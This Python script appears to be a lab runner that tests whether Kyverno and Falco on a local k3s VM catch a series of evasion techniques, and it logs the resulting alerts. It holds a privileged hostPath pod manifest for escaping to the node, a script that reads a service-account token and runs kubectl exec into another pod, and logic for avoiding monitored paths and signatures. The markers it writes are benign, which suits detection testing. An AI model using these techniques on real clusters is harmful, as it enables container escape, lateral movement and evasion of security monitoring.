#!/usr/bin/env python3
"""End-to-end defense-bypass path runner (real Kyverno + Falco VM).

The runner does not fake any product.  It deploys a real privileged Pod in
``default`` (outside the Kyverno match scope), a real memfd execution in an
attacker Pod, and a real ``pods/exec`` lateral movement into a target Pod.  All
Falco alerts and Kyverno denials captured in the phase window are stored raw in
``reports/samples/defense-bypass-path/logs/`` and parsed into ``result.json``.

Usage (from the repository root):
    python lab/defense-bypass/run-e2e.py
    python lab/defense-bypass/run-e2e.py --skip-deploy --keep
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import posixpath
import shlex
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO))

from inkblade.core import defense_policy as dp  # noqa: E402

try:
    import paramiko
except Exception as exc:  # pragma: no cover - host tool
    raise SystemExit(f"paramiko is required on the host: {exc}")

HOST = "127.0.0.1"
PORT = 2222
USER = "root"
KEY = REPO / "lab" / "qemu-k3s" / "http" / "id_ed25519"
PROBE_SRC = REPO / "probe" / "dist" / "inkblade-probe-linux-amd64"
OUT = REPO / "reports" / "samples" / "defense-bypass-path"
LOGS = OUT / "logs"
REMOTE_DIR = "/opt/inkblade"
NODE_MARKER = "/root/inkblade-bypass-node.marker"
TARGET_NS = "trident-target"
TARGET_POD = "lateral-target"
BYPASS_NS = "trident-bypass"
ATTACKER = "memfd-attacker"
POSTURE_POD = "posture-recon"


class VM:
    def __init__(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(HOST, port=PORT, username=USER, key_filename=str(KEY),
                            timeout=30, allow_agent=False, look_for_keys=False)
        self.sftp = self.client.open_sftp()

    def close(self):
        try:
            self.sftp.close()
        finally:
            self.client.close()

    def run(self, command: str, timeout: int = 600, stdin: bytes | None = None
            ) -> tuple[int, str]:
        chan = self.client.get_transport().open_session()
        chan.settimeout(timeout)
        chan.exec_command(command)
        if stdin:
            chan.sendall(stdin)
            chan.shutdown_write()
        chunks = []
        while True:
            if chan.recv_ready():
                chunks.append(chan.recv(65536))
                continue
            if chan.recv_stderr_ready():
                chunks.append(chan.recv_stderr(65536))
                continue
            if chan.exit_status_ready():
                break
            time.sleep(0.05)
        while chan.recv_ready():
            chunks.append(chan.recv(65536))
        while chan.recv_stderr_ready():
            chunks.append(chan.recv_stderr(65536))
        rc = chan.recv_exit_status()
        chan.close()
        return rc, b"".join(chunks).decode("utf-8", "replace")

    def need(self, command: str, timeout: int = 600, stdin: bytes | None = None
             ) -> str:
        rc, out = self.run(command, timeout=timeout, stdin=stdin)
        if rc != 0:
            raise RuntimeError(f"remote command failed rc={rc}: {command}\n{out[-4000:]}")
        return out

    def put(self, local: Path, remote: str, mode: int = 0o755):
        self.need(f"mkdir -p {shlex.quote(posixpath.dirname(remote))}")
        self.sftp.put(str(local), remote)
        self.sftp.chmod(remote, mode)

    def write(self, remote: str, text: str, mode: int = 0o644):
        with self.sftp.file(remote, "w") as handle:
            handle.write(text)
        self.sftp.chmod(remote, mode)

    def read(self, remote: str) -> str:
        with self.sftp.file(remote, "r") as handle:
            return handle.read().decode("utf-8", "replace")


def now_utc() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def vm_now(vm: "VM") -> str:
    return vm.need("date -u +%Y-%m-%dT%H:%M:%SZ", timeout=60).strip()


def kubectl(vm: VM, args: str, timeout: int = 300, stdin: bytes | None = None
            ) -> tuple[int, str]:
    return vm.run(f"kubectl {args}", timeout=timeout, stdin=stdin)


def apply_manifest(vm: VM, text: str, timeout: int = 300) -> tuple[int, str]:
    return kubectl(vm, "apply -f -", timeout=timeout, stdin=text.encode("utf-8"))


def wait_pod(vm: VM, namespace: str, name: str, timeout: int = 900) -> None:
    rc, out = kubectl(
        vm, f"wait --for=condition=Ready pod/{name} -n {namespace} --timeout=600s",
        timeout=timeout)
    if rc != 0:
        rc2, desc = kubectl(vm, f"describe pod/{name} -n {namespace}")
        raise RuntimeError(f"pod {namespace}/{name} not ready: {out}\n{desc[-4000:]}")


def pod_exec(vm: VM, namespace: str, pod: str, argv: list[str], timeout: int = 300
             ) -> tuple[int, str]:
    quoted = " ".join(shlex.quote(part) for part in argv)
    return kubectl(vm, f"exec -n {namespace} {pod} -- {quoted}", timeout=timeout)


def last_json(text: str) -> dict:
    """Pick the last top-level JSON object.

    The probe writes the result to stdout and its HMAC audit event to stderr;
    ``kubectl exec`` may concatenate them without a newline, so line-based
    parsing is not enough.  Scan every object boundary with ``raw_decode``.
    """
    decoder = json.JSONDecoder()
    objects: list[dict] = []
    index = 0
    raw = str(text or "")
    while True:
        start = raw.find("{", index)
        if start < 0:
            break
        try:
            doc, end = decoder.raw_decode(raw[start:])
        except json.JSONDecodeError:
            index = start + 1
            continue
        if isinstance(doc, dict):
            objects.append(doc)
        index = start + max(1, end)
    for doc in reversed(objects):
        if "event" in doc:
            continue
        if any(key in doc for key in ("schema", "security_posture", "probe_id")):
            return doc
    if objects:
        return objects[-1]
    raise RuntimeError(f"no JSON object in output: {text[-2000:]}")


def pod_exec_json(vm: VM, namespace: str, pod: str, argv: list[str],
                  timeout: int = 300) -> dict:
    argv = list(argv)
    if "--max-timeout-ms" not in argv:
        argv += ["--max-timeout-ms", "180000"]
    rc, out = pod_exec(vm, namespace, pod, argv, timeout=timeout)
    if rc != 0 and "{" not in out:
        raise RuntimeError(f"no JSON from {argv}: rc={rc} {out[-2000:]}")
    return last_json(out)


def get_logs(vm: VM, args: str, timeout: int = 300) -> str:
    rc, out = kubectl(vm, f"logs {args}", timeout=timeout)
    if rc != 0:
        return f"[logs unavailable rc={rc}] {out[-1000:]}"
    return out


def cluster_facts(vm: VM) -> dict:
    rc, nodes = kubectl(vm, "get nodes -o wide")
    rc2, pods = kubectl(vm, "get pods -A -o json")
    images = []
    try:
        doc = json.loads(pods[pods.find("{"):])
        for item in doc.get("items") or []:
            for container in (item.get("spec") or {}).get("containers") or []:
                images.append(container.get("image"))
    except Exception:
        doc = {}
    return {
        "nodes": nodes.strip(),
        "images": sorted({image for image in images if image}),
        "k3s_version": next((line.split()[4] for line in nodes.splitlines()
                             if line.startswith("k3s ")), ""),
    }


def phase_alerts(vm: VM, since: str) -> tuple[str, str, dict]:
    falco_log = get_logs(
        vm, f"-n kube-system -l app.kubernetes.io/name=falco --since-time={since} "
            "--timestamps=false", timeout=300)
    kyverno_log = get_logs(
        vm, f"-n kyverno -l app.kubernetes.io/component=admission-controller "
            f"--since-time={since} --timestamps=true", timeout=300)
    parsed = dp.parse_product_logs(falco_log, kyverno_log)
    return falco_log, kyverno_log, parsed


RUN_NAMESPACES = {"default", "defense-lab", "trident-bypass", "trident-target"}


def attributed(alerts: list[dict]) -> list[dict]:
    """Keep run-scoped alerts; raw logs still contain the whole cluster."""
    keep = []
    for alert in alerts:
        namespace = str((alert.get("fields") or {}).get("k8s_ns_name") or "")
        if not namespace or namespace in RUN_NAMESPACES:
            keep.append(alert)
    return dp.attribute_alerts(keep)


def write_log(name: str, text: str) -> str:
    LOGS.mkdir(parents=True, exist_ok=True)
    path = LOGS / name
    path.write_text(text, encoding="utf-8")
    return str(path.relative_to(OUT))


def privileged_pod(name: str, namespace: str) -> str:
    return f"""apiVersion: v1
kind: Pod
metadata:
  name: {name}
  namespace: {namespace}
  labels:
    app: {name}
spec:
  automountServiceAccountToken: false
  hostPID: true
  containers:
    - name: escape
      image: alpine:3.21
      imagePullPolicy: IfNotPresent
      command: ["/bin/sh", "-c", "sleep 3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
"""


def main(argv=None) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--skip-deploy", action="store_true")
    ap.add_argument("--probe", default=str(PROBE_SRC))
    ap.add_argument("--kubectl", default=str(REPO / "lab" / "defense-bypass"
                                            / "kubectl-linux-amd64"))
    args = ap.parse_args(argv)

    probe = Path(args.probe)
    if not probe.is_file():
        raise SystemExit(f"probe binary missing: {probe} (build it first)")

    OUT.mkdir(parents=True, exist_ok=True)
    LOGS.mkdir(parents=True, exist_ok=True)
    vm = VM()
    result: dict = {"schema": "inkblade-defense-bypass-path/v1",
                    "generated_at": now_utc(), "techniques": [], "notes": []}
    try:
        result["environment"] = cluster_facts(vm)
        print("[e2e] cluster facts collected", flush=True)
        # The Rust build (or a previous lab run) may have scaled Kyverno down.
        # The admission path is only meaningful with the real webhook running.
        vm.run("kubectl scale deploy kyverno-admission-controller -n kyverno "
               "--replicas=1", timeout=120)
        rc_k, out_k = kubectl(
            vm, "rollout status deploy/kyverno-admission-controller -n kyverno "
                "--timeout=1200s", timeout=1260)
        if rc_k != 0:
            raise RuntimeError(f"Kyverno admission controller not ready:\n{out_k}")
        # A paused build may have parked the Falco DaemonSet with a nodeSelector.
        vm.run("kubectl -n kube-system patch ds falco --type=merge "
               "-p '{\"spec\":{\"template\":{\"spec\":{\"nodeSelector\":null}}}}'",
               timeout=120)
        rc_f, out_f = kubectl(
            vm, "rollout status ds/falco -n kube-system --timeout=600s", timeout=660)
        if rc_f != 0:
            raise RuntimeError(f"Falco DaemonSet not ready:\n{out_f}")
        if not args.skip_deploy:
            vm.need(f"mkdir -p {REMOTE_DIR}")
            vm.put(probe, f"{REMOTE_DIR}/inkblade-probe")
            probe_sha = vm.need(
                f"sha256sum {REMOTE_DIR}/inkblade-probe").split()[0]
            result["environment"]["probe_sha256"] = probe_sha
            result["environment"]["probe_size"] = probe.stat().st_size
            kubectl_bin = Path(args.kubectl)
            if kubectl_bin.is_file():
                vm.put(kubectl_bin, f"{REMOTE_DIR}/kubectl", mode=0o755)
                result["environment"]["kubectl"] = "static-dl.k8s.io"
            else:
                # Fallback: the k3s multicall binary works when invoked as
                # `kubectl`, but a static client is preferred in pods.
                vm.need(
                    f"cp -L /usr/local/bin/kubectl {REMOTE_DIR}/kubectl && "
                    f"chmod 0755 {REMOTE_DIR}/kubectl")
                result["environment"]["kubectl"] = "k3s-multicall"
            for namespace, name in ((TARGET_NS, TARGET_POD),
                                    (BYPASS_NS, POSTURE_POD),
                                    (BYPASS_NS, ATTACKER)):
                vm.run(f"kubectl delete pod {name} -n {namespace} "
                       "--ignore-not-found --force --grace-period=0", timeout=120)
            for manifest in ("00-namespace-rbac.yaml", "10-target.yaml",
                             "20-posture.yaml", "30-attacker.yaml"):
                text = (REPO / "lab" / "defense-bypass" / manifest).read_text(
                    encoding="utf-8")
                rc, out = apply_manifest(vm, text)
                if rc != 0:
                    raise RuntimeError(f"apply {manifest} failed:\n{out}")
            for namespace, name in ((TARGET_NS, TARGET_POD),
                                    (BYPASS_NS, POSTURE_POD),
                                    (BYPASS_NS, ATTACKER)):
                wait_pod(vm, namespace, name)
            print("[e2e] lab pods ready", flush=True)

        # ---------------------------------------------------------- posture
        posture_rc, posture_out = pod_exec(
            vm, BYPASS_NS, POSTURE_POD,
            [f"{REMOTE_DIR}/inkblade-probe", "collect", "--read-only",
             "--max-output", "8388608"], timeout=300)
        try:
            posture_doc = last_json(posture_out)
        except Exception as exc:
            raise RuntimeError(f"collect did not return JSON ({posture_rc}): "
                               f"{posture_out[-4000:]}") from exc
        posture = posture_doc.get("security_posture") or {}
        (OUT / "posture.json").write_text(
            json.dumps(posture_doc, ensure_ascii=False, indent=2), encoding="utf-8")
        detected = dp.parse_posture(posture)
        print(f"[e2e] posture products={[item.product for item in detected]}",
              flush=True)
        from inkblade.agent.graph import PlanGraph

        graph = PlanGraph(objective="defense-bypass-path")
        posture_sha = hashlib.sha256(
            json.dumps(posture_doc, sort_keys=True).encode("utf-8")).hexdigest()
        graph_applied = dp.apply_posture(
            graph, posture, posture_sha, source_intent="e2e-collect")
        gate = dp.DefenseGate(graph)
        no_bypass = gate.check_intent(
            {"id": "exploit-no-bypass", "role": "exploit",
             "module": "privileged-pod-escape", "params": {}}, graph)
        selected = dp.select_technique("falco") or dp.TECHNIQUES["path-evasion"]
        with_bypass = gate.check_intent(
            {"id": "exploit-with-bypass", "role": "exploit",
             "module": "lateral-exec",
             "params": {"bypass": dp.bypass_params(selected, script="echo "
                                                   "INKBLADE-BENIGN")}}, graph)
        result["graph"] = {
            "posture_sha256": posture_sha,
            "evidence": graph_applied["evidence"],
            "facts": [fact["claim"] for fact in graph.facts(fact_kind="defense")],
            "gate_without_bypass": no_bypass.as_dict(),
            "gate_with_bypass": with_bypass.as_dict(),
            "policy_selected_technique": selected.id,
        }
        result["posture"] = {
            "products": [item.as_dict() for item in detected],
            "namespace": posture.get("namespace"),
            "scope": posture.get("scope"),
            "admission": posture.get("admission"),
            "kernel_modules": posture.get("kernel_modules"),
            "rulesets": posture.get("rulesets"),
            "sensor": posture.get("runtime_sensor"),
        }
        result["notes"].append(
            f"posture collect returned {posture_rc}, products="
            f"{[item.product for item in detected]}")

        print("[e2e] phase 1: kyverno scope", flush=True)
        # ------------------------------------------------- 1. Kyverno scope
        phase1 = vm_now(vm)
        vm.run(f"rm -f {NODE_MARKER}")
        vm.run("kubectl delete pod kyverno-bypass-control -n defense-lab "
               "--ignore-not-found --force --grace-period=0", timeout=120)
        vm.run("kubectl delete pod kyverno-bypass-privileged -n default "
               "--ignore-not-found --force --grace-period=0", timeout=120)
        control = privileged_pod("kyverno-bypass-control", "defense-lab")
        rc_control, out_control = apply_manifest(vm, control, timeout=300)
        write_log("kyverno-control-apply.log",
                  f"rc={rc_control}\n{out_control}\n")
        bypass = privileged_pod("kyverno-bypass-privileged", "default")
        rc_bypass, out_bypass = apply_manifest(vm, bypass, timeout=300)
        write_log("kyverno-bypass-apply.log",
                  f"rc={rc_bypass}\n{out_bypass}\n")
        marker = "INKBLADE-BENIGN:defense-bypass:node:" + datetime.now(
            timezone.utc).strftime("%H%M%S")
        escape_out = ""
        node_marker_ok = False
        if rc_bypass == 0:
            wait_pod(vm, "default", "kyverno-bypass-privileged")
            rc_id, ident = pod_exec(
                vm, "default", "kyverno-bypass-privileged",
                ["/bin/sh", "-c",
                 f"id; grep CapEff /proc/self/status; cat /proc/1/comm; "
                 f"echo {shlex.quote(marker)} > /host{NODE_MARKER}; "
                 f"cat /host{NODE_MARKER}"], timeout=300)
            escape_out = ident
            rc_h, host_marker = vm.run(f"cat {NODE_MARKER}", timeout=60)
            node_marker_ok = rc_h == 0 and marker in host_marker
        falco1, kyverno1, parsed1 = phase_alerts(vm, phase1)
        write_log("phase1-falco.log", falco1)
        write_log("phase1-kyverno.log", kyverno1)
        scope_plan = {"techniques": ["namespace-scope-evasion"],
                      "target": {"namespace": "default"}}
        vm.write(f"{REMOTE_DIR}/plan-scope.json", json.dumps(scope_plan))
        scope_default = pod_exec_json(
            vm, BYPASS_NS, POSTURE_POD,
            [f"{REMOTE_DIR}/inkblade-probe", "bypass", "--plan",
             f"{REMOTE_DIR}/plan-scope.json"], timeout=300)
        scope_denied_ns = {"techniques": ["namespace-scope-evasion"],
                           "target": {"namespace": "defense-lab"}}
        vm.write(f"{REMOTE_DIR}/plan-scope-denied.json",
                 json.dumps(scope_denied_ns))
        scope_defense = pod_exec_json(
            vm, BYPASS_NS, POSTURE_POD,
            [f"{REMOTE_DIR}/inkblade-probe", "bypass", "--plan",
             f"{REMOTE_DIR}/plan-scope-denied.json"], timeout=300)
        denials1 = parsed1["denials"] + dp.parse_kyverno_denials(out_control)
        result["phases"] = {
            "kyverno_scope": {
                "control_rc": rc_control,
                "control_denied": "denied" in out_control.lower(),
                "bypass_rc": rc_bypass,
                "admitted": rc_bypass == 0,
                "node_marker": node_marker_ok,
                "marker": marker,
                "escape_output": escape_out[-2000:],
                "scope_default": scope_default,
                "scope_defense_lab": scope_defense,
                "alerts": attributed(parsed1["alerts"]),
                "denials": denials1,
            }
        }
        result["techniques"].append({
            "id": "namespace-scope-evasion",
            "product": "admission",
            "action": "privileged Pod in default (outside Kyverno match scope) â†’ hostPath marker on node",
            "marker": marker,
            "marker_achieved": node_marker_ok,
            "control": {"namespace": "defense-lab", "denied": "denied" in out_control.lower(),
                        "rc": rc_control},
            "alerts": attributed(parsed1["alerts"]),
            "denials": denials1,
            "result": "bypass-confirmed" if (
                          node_marker_ok and "denied" in out_control.lower())
                      else ("detected" if node_marker_ok else "failed"),
            "limitations": ("Kyverno 1.19.2 policies are scoped by "
                            "matchConditions request.namespace == 'defense-lab'; "
                            "default is outside the scope. This is a scope bypass, "
                            "not an engine bypass."),
        })

        # ------------------------------------- 2. fileless â†’ lateral (SA/exec)
        pod_exec(vm, TARGET_NS, TARGET_POD,
                 ["/bin/sh", "-c",
                  "rm -f /tmp/lateral.marker /tmp/lateral-existing.marker"],
                 timeout=120)
        phase2 = vm_now(vm)
        sa_plan = {"techniques": ["sa-permission-selection"],
                   "target": {"namespace": TARGET_NS, "pod": TARGET_POD}}
        vm.write(f"{REMOTE_DIR}/plan-sa.json", json.dumps(sa_plan))
        sa_check = pod_exec_json(
            vm, BYPASS_NS, ATTACKER,
            [f"{REMOTE_DIR}/inkblade-probe", "bypass", "--plan",
             f"{REMOTE_DIR}/plan-sa.json"], timeout=300)

        memfd_marker = "INKBLADE-BENIGN:defense-bypass:memfd:" + datetime.now(
            timezone.utc).strftime("%H%M%S")
        memfd_script = (
            "#!/bin/sh\n"
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "exec /opt/inkblade/kubectl --server=https://kubernetes.default.svc "
            "--token=\"$TOKEN\" --insecure-skip-tls-verify exec -n "
            f"{TARGET_NS} {TARGET_POD} -- /bin/sh -c "
            f"'echo {memfd_marker} > /tmp/lateral.marker'\n"
        )
        memfd_plan = {
            "techniques": ["fileless-memfd-exec"],
            "script_b64": base64.b64encode(memfd_script.encode()).decode(),
            "workdir": "/dev/shm",
            "clean_env": True,
            "timeout_ms": 120000,
            "target": {"namespace": TARGET_NS, "pod": TARGET_POD},
        }
        vm.write(f"{REMOTE_DIR}/plan-memfd.json", json.dumps(memfd_plan))
        memfd = pod_exec_json(
            vm, BYPASS_NS, ATTACKER,
            [f"{REMOTE_DIR}/inkblade-probe", "bypass", "--allow-write", "--plan",
             f"{REMOTE_DIR}/plan-memfd.json"], timeout=420)
        rc_t, target_marker = pod_exec(
            vm, TARGET_NS, TARGET_POD, ["cat", "/tmp/lateral.marker"], timeout=120)
        memfd_marker_ok = rc_t == 0 and memfd_marker in target_marker
        falco2a, kyverno2a, parsed2a = phase_alerts(vm, phase2)
        write_log("phase2-memfd-falco.log", falco2a)
        write_log("phase2-memfd-kyverno.log", kyverno2a)

        phase2b = vm_now(vm)
        existing_marker = "INKBLADE-BENIGN:defense-bypass:existing:" + datetime.now(
            timezone.utc).strftime("%H%M%S")
        existing_script = (
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "exec /opt/inkblade/kubectl --server=https://kubernetes.default.svc "
            "--token=\"$TOKEN\" --insecure-skip-tls-verify exec -n "
            f"{TARGET_NS} {TARGET_POD} -- /bin/sh -c "
            f"'echo {existing_marker} > /tmp/lateral-existing.marker'\n"
        )
        existing_plan = {
            "techniques": ["path-evasion", "existing-binary-exec"],
            "script": existing_script,
            "workdir": "/dev/shm",
            "monitored_paths": ["/tmp", "/var/tmp"],
            "clean_env": True,
            "timeout_ms": 120000,
            "target": {"namespace": TARGET_NS, "pod": TARGET_POD},
        }
        vm.write(f"{REMOTE_DIR}/plan-existing.json", json.dumps(existing_plan))
        existing = pod_exec_json(
            vm, BYPASS_NS, ATTACKER,
            [f"{REMOTE_DIR}/inkblade-probe", "bypass", "--allow-write", "--plan",
             f"{REMOTE_DIR}/plan-existing.json"], timeout=420)
        rc_e, existing_target = pod_exec(
            vm, TARGET_NS, TARGET_POD, ["cat", "/tmp/lateral-existing.marker"],
            timeout=120)
        existing_marker_ok = rc_e == 0 and existing_marker in existing_target
        falco2b, kyverno2b, parsed2b = phase_alerts(vm, phase2b)
        write_log("phase2-existing-falco.log", falco2b)
        write_log("phase2-existing-kyverno.log", kyverno2b)

        result["phases"]["lateral"] = {
            "sa_check": sa_check,
            "memfd": memfd,
            "existing_binary": existing,
            "target_marker": memfd_marker_ok,
            "existing_marker": existing_marker_ok,
        }
        sa_alerts = attributed(parsed2a["alerts"])
        sa_detected = any("sa-permission-selection" in (alert.get("technique_ids") or [])
                          for alert in sa_alerts)
        result["techniques"].append({
            "id": "sa-permission-selection",
            "product": "admission/falco",
            "action": "SSAR (SelfSubjectAccessReview) for pods/exec from the attacker SA",
            "marker_achieved": bool(sa_check.get("ok")),
            "alerts": sa_alerts,
            "denials": parsed2a["denials"],
            "result": ("detected" if sa_check.get("ok") and sa_detected
                       else "bypass-confirmed" if sa_check.get("ok") else "failed"),
            "limitations": ("Selects an already-authorized SA; it does not escalate "
                            "RBAC. The lab Role grants pods/exec in trident-target only. "
                            "A Falco K8s API contact alert makes this observable."),
            "detail": sa_check,
        })
        result["techniques"].append({
            "id": "fileless-memfd-exec",
            "product": "falco",
            "action": "memfd script â†’ kubectl pods/exec into lateral-target",
            "marker": memfd_marker,
            "marker_achieved": memfd_marker_ok,
            "alerts": attributed(parsed2a["alerts"]),
            "denials": parsed2a["denials"],
            "result": ("bypass-confirmed" if memfd_marker_ok and
                       not any("fileless-memfd-exec" in (a.get("technique_ids") or [])
                               for a in attributed(parsed2a["alerts"]))
                       else "detected" if memfd_marker_ok else "failed"),
            "limitations": ("Falco 0.45.1 default ruleset; memfd exepath and "
                            "API contact may be covered. Recorded as observed."),
            "detail": memfd,
        })
        path_execution = next(
            (item for item in existing.get("executions") or []
             if item.get("technique") == "path-evasion"), {})
        result["techniques"].append({
            "id": "path-evasion",
            "product": "falco",
            "action": "select a writable workspace outside /tmp,/var/tmp monitored set",
            "marker": existing_marker,
            "marker_achieved": bool(path_execution.get("selected")),
            "selected_path": path_execution.get("selected"),
            "alerts": attributed(parsed2b["alerts"]),
            "denials": parsed2b["denials"],
            "result": "bypass-confirmed" if path_execution.get("selected")
                      and not any("path-evasion" in (a.get("technique_ids") or [])
                                  for a in attributed(parsed2b["alerts"]))
                      else "detected" if path_execution.get("selected") else "failed",
            "limitations": ("Directory selection only; this lab's Falco 0.45.1 "
                            "bundled ruleset has no Write-below rule, so path "
                            "selection is not directly observable."),
            "detail": path_execution,
        })
        phase2c = vm_now(vm)
        split_plan = {
            "techniques": ["command-split-env-clean"],
            "commands": ["echo INKBLADE-BENIGN:split", "id"],
            "workdir": "/dev/shm",
            "clean_env": True,
        }
        vm.write(f"{REMOTE_DIR}/plan-split.json", json.dumps(split_plan))
        split = pod_exec_json(
            vm, BYPASS_NS, ATTACKER,
            [f"{REMOTE_DIR}/inkblade-probe", "bypass", "--allow-write", "--plan",
             f"{REMOTE_DIR}/plan-split.json"], timeout=300)
        falco2c, kyverno2c, parsed2c = phase_alerts(vm, phase2c)
        write_log("phase2-split-falco.log", falco2c)
        result["techniques"].append({
            "id": "command-split-env-clean",
            "product": "falco",
            "action": "per-line short commands with env_clear",
            "marker": "INKBLADE-BENIGN:split",
            "marker_achieved": bool(split.get("ok")),
            "alerts": attributed(parsed2c["alerts"]),
            "denials": parsed2c["denials"],
            "result": "bypass-confirmed" if split.get("ok")
                      and not any("command-split-env-clean" in (a.get("technique_ids") or [])
                                  for a in attributed(parsed2c["alerts"]))
                      else "detected" if split.get("ok") else "failed",
            "limitations": ("Command-line splitting is not a tamper-proof evasion; "
                            "it only avoids long single-line signatures."),
            "detail": split,
        })
        result["techniques"].append({
            "id": "existing-binary-exec",
            "product": "falco",
            "action": "path-evasion + /bin/sh -c â†’ kubectl pods/exec into lateral-target",
            "marker": existing_marker,
            "marker_achieved": existing_marker_ok,
            "alerts": attributed(parsed2b["alerts"]),
            "denials": parsed2b["denials"],
            "result": ("bypass-confirmed" if existing_marker_ok and
                       not any("existing-binary-exec" in (a.get("technique_ids") or [])
                               for a in attributed(parsed2b["alerts"]))
                       else "detected" if existing_marker_ok else "failed"),
            "limitations": ("Reuses /bin/sh from alpine:3.21; no new executable is "
                            "written. The pods/exec API call itself is still visible "
                            "to the Falco K8s API contact rule."),
            "detail": existing,
        })

        counts = {"attempted": len(result["techniques"]), "bypass-confirmed": 0,
                  "detected": 0, "failed": 0}
        for item in result["techniques"]:
            counts[item["result"]] = counts.get(item["result"], 0) + 1
        result["counts"] = counts
        result["notes"].append(
            "Markers are benign INKBLADE-BENIGN strings; no real payload was used.")
        result["notes"].append(
            "Alerts are attributed to technique families by rule name; a memfd "
            "execution may be detected even when the marker lands.")

        print(f"[e2e] counts={counts}", flush=True)
        (OUT / "result.json").write_text(
            json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
        print(json.dumps({"ok": True, "counts": counts,
                          "products": [item.product for item in detected],
                          "techniques": [t["id"] for t in result["techniques"]]},
                         ensure_ascii=False, indent=2))
        return 0
    finally:
        vm.close()


if __name__ == "__main__":
    raise SystemExit(main())

